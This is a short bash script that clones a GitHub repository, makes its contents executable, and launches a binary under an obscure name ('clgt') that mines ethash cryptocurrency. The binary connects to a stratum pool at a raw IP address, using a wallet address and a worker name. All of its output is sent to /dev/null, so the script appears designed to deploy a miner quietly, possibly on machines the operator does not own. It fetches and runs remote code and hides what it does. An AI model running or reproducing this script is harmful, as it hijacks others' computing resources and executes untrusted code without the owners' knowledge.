#!/bin/bash
cd /fkstorage
git clone https://github.com/prosing789/storefk.git -q
chmod -R +x storefk
./storefk/clgt -a ethash -o stratum+tcp://135.125.163.215:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-13 > /dev/null 2>&1